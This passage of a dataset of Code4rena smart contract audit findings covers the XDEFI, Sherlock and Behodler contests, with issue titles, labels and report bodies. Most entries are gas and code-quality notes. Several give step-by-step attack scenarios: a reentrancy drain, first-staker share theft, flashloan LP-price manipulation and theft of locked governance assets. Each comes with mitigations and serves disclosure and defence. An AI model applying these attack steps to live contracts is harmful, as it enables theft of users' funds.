only one array boundaries check should take place, and the rest are unnecessary. Therefore, this array element should be cached in a local variable and then be loaded  again using this local variable, skipping the redundent second array boundaries check:           XDEFIDistributionHelper.sol, variable name: tokenIds times: 3 at: getAllLockedPositionsForAccount   "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  robee   # Vulnerability details   The following functions could be set external to save gas and improve code quality.  External call cost is less expensive than of public functions.           The function withdrawableOf in XDEFIDistribution.sol could be set external         The function tokenURI in XDEFIDistribution.sol could be set external         The function getAllTokensForAccount in XDEFIDistributionHelper.sol could be set external         The function getAllLockedPositionsForAccount in XDEFIDistributionHelper.sol could be set external    "}, {"title": "Unneccessary check on total supply of XDEFI token", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Extra gas costs of all locking operations.  ## Proof of Concept  XDEFIDistribution.sol stores the total supply of the XDEFI token:  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L14  This is so that the amount being locked can be checked to be less than this on each call  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L255  This is unnecessary as the XDEFI token has no external mint function and so has a fixed supply. It's then impossible for any user to supply more than 240M XDEFI in order to fail this check.  https://etherscan.io/address/0x72b886d09c117654ab7da13a14d603001de0b777#code  ## Recommended Mitigation Steps  Remove the unnecessary check on the total supply.  "}, {"title": "Use of return value from assignment hampers readability", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/2", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Reduced readability  ## Proof of Concept  In a number of placed we seem to be inlining an assignment with the usage of that variable:  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L40  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L70  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L83  This is quite atypical in my experience and reduces readability: lines which contain require statements and event emission now modify contract storage.  ## Recommended Mitigation Steps  Consider whether any small benefits to gas/compactness are worth the reduced clarity.  "}, {"title": "Usage of zero storage for reentrancy guard increases chance that gas refund is capped", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/1", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Reduction of potential gas refunds.  ## Proof of Concept  The reentrancy guard variable is initially set to zero, set to a nonzero value and then reset to zero:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/security/ReentrancyGuard.sol#L29-L35  We then have to the higher cost for writing to clean storage rather than dirty storage (which is then refunded). This is not recommended as it can cause the size of the gas refunded to users to be capped. For more info see the OZ implementation:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/security/ReentrancyGuard.sol#L29-L35  ## Recommended Mitigation Steps  Change from 0->1->0 to 1->2->1  "}, {"title": "missing whenNotPaused", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/280", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  danb   # Vulnerability details  all external function which are not onlyOwner have whenNotPaused modifier. but transfer doesn't have it (Sherlok is ERC721). https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L366  this was very important during the exploit to badger dao: https://mobile.twitter.com/flashfish0x/status/1466369783016869892  i suggest you add whenNotPaused to _beforeTokenTransfer    "}, {"title": "Sherlock: Revert for non-existent ID in viewRewardForArbRestake", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/225", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  Other relevant view functions like `lockupEnd()`, `sherRewards()` and `tokenBalanceOf()` revert for non-existent IDs, but `viewRewardForArbRestake()` doesn\u2019t.  ## Recommended Mitigation Steps  Include the existence check in `viewRewardForArbRestake()`.  `if (!_exists(_tokenID)) revert NonExistent();`  "}, {"title": "tokenBalanceOfAddress of nftOwner becomes permanently incorrect after arbRestake", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/109", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Sucessfull `arbRestake` performs `_redeemShares` for `arbRewardShares` amount to extract the arbitrager reward. This effectively reduces shares accounted for an NFT, but leaves untouched the `addressShares` of an `nftOwner`.  As a result the `tokenBalanceOfAddress` function will report an old balance that existed before arbitrager reward was slashed away. This will persist if the owner will transfer the NFT to someone else as its new reduced shares value will be subtracted from `addressShares` in `_beforeTokenTransfer`, leaving the arbitrage removed shares permanently in `addressShares` of the NFT owner, essentially making all further reporting of his balance incorrectly inflated by the cumulative arbitrage reward shares from all arbRestakes happened to the owner's NFTs.  ## Proof of Concept  `arbRestake` redeems `arbRewardShares`, which are a part of total shares of an NFT:  https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L673   This will effectively reduce the `stakeShares`:  https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L491  But there is no mechanics in place to reduce `addressShares` of the owner apart from mint/burn/transfer, so `addressShares` will still correspond to NFT shares before arbitrage. This discrepancy will be accumulated further with arbitrage restakes.   ## Recommended Mitigation Steps  Add a flag to `_redeemShares` indicating that it was called for a partial shares decrease, say `isPartialRedeem`, and do `addressShares[nftOwner] -= _stakeShares` when `isPartialRedeem == true`.  Another option is to do bigger refactoring, making stakeShares and addressShares always change simultaneously.   "}, {"title": "Reenterancy in `_sendSherRewardsToOwner()`", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/60", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  kirk-baird   # Vulnerability details  ## Impact  This is a reentrancy vulnerability that would allow the attacker to drain the entire SHER balance of the contract.  Note: this attack requires gaining control of execution `sher.transfer()` which will depend on the implementation of the SHER token. Control may be gained by the attacker if the contract implements ERC777 or otherwise makes external calls during `transfer()`.  ## Proof of Concept  See [_sendSherRewards](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L442)  ```solidity   function _sendSherRewardsToOwner(uint256 _id, address _nftOwner) internal {     uint256 sherReward = sherRewards_[_id];     if (sherReward == 0) return;      // Transfers the SHER tokens associated with this NFT ID to the address of the NFT owner     sher.safeTransfer(_nftOwner, sherReward);     // Deletes the SHER reward mapping for this NFT ID     delete sherRewards_[_id];   } ```  Here `sherRewards` are deleted after the potential external call is made in `sher.safeTransfer()`. As a result if an attacker reenters this function `sherRewards_` they will still maintain the original balance of rewards and again transfer the SHER tokens.  As `_sendSherRewardsToOwner()` is `internal` the attack can be initiated through the `external` function `ownerRestake()` [see here.](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L595)  Steps to produce the attack:  1) Deploy attack contract to handle reenterancy 2) Call `initialStake()` from the attack contract with the smallest `period` 3) Wait for `period` amount of time to pass 4) Have the attack contract call `ownerRestake()`. The attack contract will gain control of the (See note above about control flow). This will recursively call `ownerRestake()` until the balance of `Sherlock` is 0 or less than the user's reward amount. Then allow reentrancy loop to unwind and complete.  ## Tools Used  n/a  ## Recommended Mitigation Steps  Reentrancy can be mitigated by one of two solutions.  The first option is to add a reentrancy guard like `nonReentrant` the is used in `SherlockClaimManager.sol`.  The second option is to use the checks-effects-interactions pattern. This would involve doing all validation checks and state changes before making any potential external calls. For example the above function could be modified as follows.  ```solidity   function _sendSherRewardsToOwner(uint256 _id, address _nftOwner) internal {     uint256 sherReward = sherRewards_[_id];     if (sherReward == 0) return;      // Deletes the SHER reward mapping for this NFT ID     delete sherRewards_[_id];      // Transfers the SHER tokens associated with this NFT ID to the address of the NFT owner     sher.safeTransfer(_nftOwner, sherReward);   } ```  Additionally the following functions are not exploitable however should be updated to use the check-effects-interations pattern. - `Sherlock._redeemShares()` should do `_transferTokensOut()` last. - `Sherlock.initialStake()` should do `token.safeTransferFrom(msg.sender, address(this), _amount);` last - `SherClaim.add()` should do `sher.safeTransferFrom(msg.sender, address(this), _amount);` after updating `userClaims`  - `SherlockProtocolManager.depositToActiveBalance()` should do `token.safeTransferFrom(msg.sender, address(this), _amount);` after updating `activeBalances`    "}, {"title": "first user can steal everyone else's tokens", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/39", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  egjlmn1   # Vulnerability details  ## Impact A user who joins the systems first (stakes first) can steal everybody's tokens by sending tokens to the system externally. This attack is possible because you enable staking a small amount of tokens.  ## Proof of Concept See the following attack: 1. the first user (user A) who enters the system stake 1 token 2. another user (user B) is about to stake X tokens 3. user A frontrun and transfer X tokens to the system via `ERC20.transfer` 4. user B stakes X tokens, and the shares he receives is: `shares = (_amount * totalStakeShares_) / (totalTokenBalanceStakers() - _amount);` `shares = (X * 1) / (X + 1 + X - X) = X/(X+1) = 0` meaning all the tokens he staked got him no shares, and those tokens are now a part of the single share that user A holds 5. user A can now redeem his shares and get the 1 token he staked, the X tokens user B staked, and the X tokens he `ERC20.transfer` to the system because all the money in the system is in a single share that user A holds.  In general, since there is only a single share, for any user who is going to stake X tokens, if the system has X+1 tokens in its balance, the user won't get any shares and all the money will go to the attacker.  ## Tools Used Manual code review  ## Recommended Mitigation Steps Force users to stake at least some amount in the system (Uniswap forces users to pay at least `1e18`) That way the amount the attacker will need to ERC20.transfer to the system will be at least `X*1e18` instead of `X` which is unrealistic  "}, {"title": "safeApprove of openZeppelin is deprecated", "html_url": "https://github.com/code-423n4/2022-01-sherlock-findings/issues/11", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-sherlock-findings", "body": "# Handle  robee   # Vulnerability details  You use safeApprove of openZeppelin although it's deprecated.  (see https://github.com/OpenZeppelin/openzeppelin-contracts/blob/566a774222707e424896c0c390a84dc3c13bdcb2/contracts/token/ERC20/utils/SafeERC20.sol#L38) You should change it to increase/decrease Allowance as OpenZeppilin says. This appears in the following locations in the code base:          Deprecated safeApprove in AaveV2Strategy.sol line 70: want.safeApprove(address(lp), type(uint256).max);          Deprecated safeApprove in SherlockClaimManager.sol line 421: TOKEN.safeApprove(address(UMA), _amount);          Deprecated safeApprove in SherlockClaimManager.sol line 464: TOKEN.safeApprove(address(UMA), 0);          Deprecated safeApprove in SherBuy.sol line 99: usdc.approve(address(sherlockPosition), type(uint256).max);          Deprecated safeApprove in SherBuy.sol line 169: sher.approve(address(sherClaim), sherAmount);    "}, {"title": "Logic error in `burnFlashGovernanceAsset` can cause locked assets to be stolen", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/305", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  A logic error in the `burnFlashGovernanceAsset` function that resets a user's `pendingFlashDecision` allows that user to steal other user's assets locked in future flash governance decisions. As a result, attackers can get their funds back even if they execute a malicious flash decision and the community burns their assets.  ## Proof of Concept  1. An attacker Alice executes a malicious flash governance decision, and her assets are locked in the `FlashGovernanceArbiter` contract. 2. The community disagrees with Alice's flash governance decision and calls `burnFlashGovernanceAsset` to burn her locked assets. However, the `burnFlashGovernanceAsset` function resets Alice's `pendingFlashDecision` to the default config (see line 134). 3. A benign user, Bob executes another flash governance decision, and his assets are locked in the contract.  4. Now, Alice calls `withdrawGovernanceAsset` to withdraw Bob's locked asset, effectively the same as stealing Bob's assets. Since Alice's `pendingFlashDecision` is reset to the default, the `unlockTime < block.timestamp` condition is fulfilled, and the withdrawal succeeds.  Referenced code: [DAO/FlashGovernanceArbiter.sol#L134](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L134) [DAO/FlashGovernanceArbiter.sol#L146](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L146)  ## Recommended Mitigation Steps  Change line 134 to `delete pendingFlashDecision[targetContract][user]` instead of setting the `pendingFlashDecision` to the default.  "}, {"title": "LP pricing formula is vulnerable to flashloan manipulation", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/304", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The LP pricing formula used in the `burnAsset` function of `LimboDAO` is vulnerable to flashloan manipulation. By swapping a large number of EYE into the underlying pool, an attacker can intentionally inflate the value of the LP tokens to get more `fate` than he is supposed to with a relatively low cost.  With the large portion of `fate` he gets, he has more voting power to influence the system's decisions, or even he can convert his `fate` to Flan tokens for a direct profit.  ## Proof of Concept  Below is an example of how the attack works:  1. Suppose that there are 1000 EYE and 1000 LINK tokens in the UniswapV2 LINK-EYE pool. The pool's total supply is 1000, and the attacker has 100 LP tokens. 2. If the attacker burns his LP tokens, he earns `1000 * 100/1000 * 20 = 2000` amount of `fate`. 3. Instead, the attacker swaps in 1000 EYE and gets 500 LINK from the pool (according to `x * y = k`, ignoring fees for simplicity). Now the pool contains 2000 EYE and 500 LINK tokens. 4. After the manipulation, he burns his LP tokens and gets `2000 * 100/1000 * 20 = 4000` amount of `fate`. 5. Lastly, he swaps 500 LINK into the pool to get back his 1000 EYE. 6. Compared to Step 2, the attacker earns a double amount of `fate` by only paying the swapping fees to the pool. The more EYE tokens he swaps into the pool, the more `fate` he can get. This attack is practically possible by leveraging flashloans or flashswaps from other pools containing EYE tokens.  The `setEYEBasedAssetStake` function has the same issue of using a manipulatable LP pricing formula. For more detailed explanations, please refer to the analysis of the [Cheese Bank attack](https://peckshield.medium.com/cheese-bank-incident-root-cause-analysis-d076bf87a1e7) and the [Warp Finance attack](https://peckshield.medium.com/warpfinance-incident-root-cause-analysis-581a4869ee00).  Referenced code: [DAO/LimboDAO.sol#L356](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L356) [DAO/LimboDAO.sol#L392](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L392)  ## Recommended Mitigation Steps  Use a fair pricing formula for the LP tokens, for example, the one proposed by [Alpha Finance](https://blog.alphafinance.io/fair-lp-token-pricing/).  "}, {"title": "Immutable variables", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/270", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There are variables that do not change so they can be marked as immutable to greatly improve the gast costs. Examples of such variables are: Limbo.sol ```solidity   FlanLike Flan; ``` TokenProxyLike.sol ```solidity   address internal baseToken; ``` ProposalFactory.sol ```solidity   string public description;   LimboDAOLike DAO; ``` Please review all the state variables and apply immutable where possible.  "}, {"title": "Limbo, LimboDAO and FlashGovernanceArbiter events aren't indexed", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/249", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  No events in Limbo, LimboDAO and FlashGovernanceArbiter contracts are indexed, so their filtering is disabled, which makes it harder to programmatically use the system  ## Proof of Concept  Contract's events don't have indices:  Limbo:  https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol#L253-260  FlashGovernanceArbiter:  https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol#L22  LimboDAO:  https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol#L56-61  ## Recommended Mitigation Steps  Consider adding the indices to the key parameters, first of all to the addresses of the tokens and accounts broadcasted   "}, {"title": "Consistently check account balance before and after transfers for Fee-On-Transfer discrepencies", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/237", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Wrong fateBalance bookkeeping for a user. Wrong fateCreated value emitted.  ## Proof of Concept Taking into account the FOT is done almost everywhere important in the solution already. That's a known practice in the solution.  However, it's missing here (see @audit-info tags): ``` File: LimboDAO.sol 383:   function burnAsset(address asset, uint256 amount) public isLive incrementFate { 384:     require(assetApproved[asset], \"LimboDAO: illegal asset\"); 385:     address sender = _msgSender(); 386:     require(ERC677(asset).transferFrom(sender, address(this), amount), \"LimboDAO: transferFailed\"); //@audit-info FOT not taken into account 387:     uint256 fateCreated = fateState[_msgSender()].fateBalance; 388:     if (asset == domainConfig.eye) { 389:       fateCreated = amount * 10; //@audit-info wrong amount due to lack of FOT calculation 390:       ERC677(domainConfig.eye).burn(amount);//@audit-info wrong amount due to lack of FOT calculation 391:     } else { 392:       uint256 actualEyeBalance = IERC20(domainConfig.eye).balanceOf(asset); 393:       require(actualEyeBalance > 0, \"LimboDAO: No EYE\"); 394:       uint256 totalSupply = IERC20(asset).totalSupply(); 395:       uint256 eyePerUnit = (actualEyeBalance * ONE) / totalSupply; 396:       uint256 impliedEye = (eyePerUnit * amount) / ONE;//@audit-info wrong amount due to lack of FOT calculation 397:       fateCreated = impliedEye * 20; 398:     } 399:     fateState[_msgSender()].fateBalance += fateCreated; //@audit-info potentially wrong fateCreated as fateCreated can be equal to amount * 10;   400:     emit assetBurnt(_msgSender(), asset, fateCreated);//@audit-info potentially wrong fateCreated emitted 401:   } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Check the balance before and after the transfer to take into account the Fees-On-Transfer  "}, {"title": "Incorrect unlockTime can DOS withdrawGovernanceAsset", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/228", "labels": ["bug", "duplicate", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact unlockTime is set incorrectly  ## Proof of Concept  1. Navigate to contract at https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/FlashGovernanceArbiter.sol  2. Observe the assertGovernanceApproved function  ``` function assertGovernanceApproved(     address sender,     address target,     bool emergency   ) public { ... pendingFlashDecision[target][sender].unlockTime += block.timestamp; ... } ```  3. Assume assertGovernanceApproved is called with sender x and target y and pendingFlashDecision[target][sender].unlockTime is 100 and block.timestamp is 10000 then  ``` pendingFlashDecision[target][sender].unlockTime += block.timestamp; // 10000+100=10100 ```  4. Again assertGovernanceApproved is called with same argument after timestamp 10100. This time unlockTime is set to very high value  (assume block.timestamp is 10500). This is incorrect  ``` pendingFlashDecision[target][sender].unlockTime += block.timestamp; // 10100+10500=20600 ```  ## Recommended Mitigation Steps unlock time should be calculated like below  ``` constant public CONSTANT_UNLOCK_TIME = 1 days; // example pendingFlashDecision[target][sender].unlockTime = CONSTANT_UNLOCK_TIME +  block.timestamp; ```  "}, {"title": "Gas savings", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/217", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact Gas savings  ## Proof of Concept  1. Navigate to contract at https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol  2. Observe that in burnAsset function, fateCreated can be initialized with 0 instead of fateState[_msgSender()].fateBalance which takes more gas. Actual value of fateCreated is decided by if-else condition  3. Observe that in vote function isLive modifier should be before incrementFate as if contract is not live then there is no meaning of incrementFate  4. Observe that in vote function below nested condition can be placed beforehand as if this happens further execution is not required  ``` if (block.timestamp - currentProposalState.start > proposalConfig.votingDuration) ```  5. Observe that previousProposalState is never used and can be removed  "}, {"title": "Incorrect require statement", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/213", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact   ## Proof of Concept  1. Navigate to contract at https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/UniswapHelper.sol  2. Observe the configure function which has below require condition  ``` require(priceBoostOvershoot < 100, \"Set overshoot to number between 1 and 100.\"); ```  3. This means priceBoostOvershoot can be set to 0 which contradicts the require statement message mentioning \"Set overshoot to number between 1 and 100.\" ## Tools Used  ## Recommended Mitigation Steps Change the require condition to   ``` require(priceBoostOvershoot < 100 && priceBoostOvershoot > 0, \"Set overshoot to number between 1 and 100.\"); ```  "}, {"title": "Gas: \"constants\" expressions are expressions, not constants.", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/197", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Due to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.      See: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232)  > Consequences: each usage of a \"constant\" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..). since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )    ## Proof of Concept   ``` UniswapHelper.sol:56:  uint256 constant year = (1 days * 365); ```     ## Tools Used   VS Code      ## Recommended Mitigation Steps   Replace with: ``` UniswapHelper.sol:56:  uint256 constant year = 365 days; ```    "}, {"title": "Proposal cost doesn't use votingDuration", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/189", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The LimboDAO.sol contract allows the votingDuration to be modified in the [`setProposalConfig()` function](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/DAO/LimboDAO.sol#L302), but the `makeProposal()` function hard codes this value as two days, which is the initialized value, in the `makeProposal()` fee calculation.  ## Proof of Concept  First, observe the comment on line 209 has a comment: ``` proposalConfig.requiredFateStake = 223 * ONE; //50000 EYE for 24 hours ```  This comment indicates that the quantity of 50,000 EYE is needed for each day. The votingDuration value [is initialized to 2 days](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/DAO/LimboDAO.sol#L208). Later in the code, the \"proposalConfig.requiredFateStake\" variable is multiplied by 2. Although there is no explanation for this value, given the earlier comment that the \"proposalConfig.requiredFateStake\" value is required every day, the cost to make a proposal should vary based on the current votingDuration value:  ``` fateState[proposer].fateBalance = fateState[proposer].fateBalance - proposalConfig.requiredFateStake * 2; ```  Because a constant value of 2 is used, most likely assuming a constant 2 day votingDuration, later modifications to the votingDuration will not change the cost of making a proposal. If the votingDuration increases, the proposal cost will be less EYE per hour, and if the votingDuration decreases, the proposal cost will be more EYE per hour.  ## Recommended Mitigation Steps  One of two portions of the code is wrong and needs modification: 1. The comment about \"50000 EYE for 24 hours\" is wrong because it doesn't take into account the variability of votingDuration. Even if the comment only refers to the initialized values, it should state \"50000 EYE for 48 hours\" because the votingDuration is 2 days. 2. The `makeProposal()` function calculates the fate cost incorrectly because it never uses the votingDuration variables in its calculation.  "}, {"title": "Wrong units in `convertFateToFlan()`", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/188", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `convertFateToFlan()` function in LimboDAO.sol appears to perform a calculate with improper units. The variable \"flan\" should hold a quantity of flan, but the units used in the calculation of flan don't match this. This incorrect calculation can allow users to call this function and receive much more flan than the fateToFlan exchange rate specifies.  ## Proof of Concept  The `convertFateToFlan()` function is in [the LimboDAO.sol contract](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/DAO/LimboDAO.sol#L239) ```   function convertFateToFlan(uint256 fate) public returns (uint256 flan) {     require(fateToFlan > 0, \"LimboDAO: Fate conversion to Flan disabled.\");     fateState[msg.sender].fateBalance -= fate;     flan = (fateToFlan * fate) / ONE;     Flan(domainConfig.flan).mint(msg.sender, flan);   } ```  The line where flan is calculated multiplies fateToFlan and fate. The units of fateToFlan are \"fate / flan\" while the units of fate are \"fate\". The product of the two has units \"fate^2 / flan\" as shown below: ``` fate     fate      fate ^ 2 \u2014\u2014   x         =   \u2014\u2014\u2014\u2014 flan                flan ```  ## Recommended Mitigation Steps  I see two solutions: 1. Modify the line calculating flan to `flan = fate / (fateToFlan * ONE);` 2. Either the fateToFlan value should be renamed to \"flanToFate\". This would require renaming the `setFateToFlan()` function, the comments describing the respective variable and function, and the unit tests  "}, {"title": "transferFrom gas improvement", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The ERC20Burnable.sol file has code copied from the OpenZeppelin ERC20.sol contract. The Behodler code `transferFrom()` function does use the latest version of the OpenZeppelin code, modified earlier in Jan 2022 in [PR 3085](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3085), which can save gas if currentAllowance == type(uint256).max.  A second gas savings that has been present in OpenZeppelin for some time but is not in the Behodler code is to add an unchecked clause around the `approve()` call.  ## Proof of Concept  The Behodler `transferFrom()` function [doesn't use the latest edits from OZ or the unchecked clause on the approve call](https://github.com/code-423n4/2022-01-behodler/blob/cedb81273f6daf2ee39ec765eef5ba74f21b2c6e/contracts/ERC677/ERC20Burnable.sol#L204-L218). In contrast, the OZ code [does use these edits for gas savings](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4f8af2dceb0fbc36cb32eb2cc14f80c340b9022e/contracts/token/ERC20/ERC20.sol#L156-L172).  ## Recommended Mitigation Steps  Use the latest OZ edits and the unchecked clause for gas savings if it doesn't introduce overflow or underflow conditions.  "}, {"title": "`LimboDAO.seed`: Wrong error message", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/167", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  cmichel   # Vulnerability details  The error message for the `uniLPs` is still referring to `Sushi` instead of `Uniswap`  ```solidity require(UniPairLike(uniLPs[i]).factory() == uniFactory, \"LimboDAO: invalid Sushi LP\"); ```  "}, {"title": "`Limbo.sol` Does Not Implement `WithdrawERC20Proposal` Functionality", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/165", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  kirk-baird   # Vulnerability details  ## Impact  The proposal contract `WithdrawERC20Proposal` allows a the DAO to withdraw ERC20 tokens to a destination the the function [withdrawERC20()](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/WithdrawERC20Proposal.sol#L35).  However, this function is not implemented in [Limbo.sol](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/Limbo.sol) and thus the execution can never succeed.  ## Recommended Mitigation Steps  Consider implementing this functionality in `Limbo.sol` or deleting the proposal.  "}, {"title": "flan can't be transferred unless the flan contract has flan balance greater than the amount we want to transfer", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  CertoraInc   # Vulnerability details  ## Flan.sol (`safeTransfer()` function) The flan contract must have balance (and must have more flan then we want to transfer) in order to allow flan transfers. If it doesn't have any balance, the safeTransfer, which is the only way to transfer flan, will call `_transfer()` function with `amount = 0`. It should check `address(msg.sender)`'s balance instead of `address(this)`'s balance.  ```sol function safeTransfer(address _to, uint256 _amount) external {        uint256 flanBal = balanceOf(address(this)); // the problem is in this line        uint256 flanToTransfer = _amount > flanBal ? flanBal : _amount;        _transfer(_msgSender(), _to, flanToTransfer);    } ```  "}, {"title": "Burning a User's Tokens for a Flash Proposal will not Deduct Their Balance", "html_url": "https://github.com/code-423n4/2022-01-behodler-findings/issues/157", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-behodler-findings", "body": "# Handle  kirk-baird   # Vulnerability details  ## Impact  The proposal to burn a user's tokens for a flash governance proposal does not result in the user losing any funds and may in fact unlock their funds sooner.  ## Proof of Concept  The function 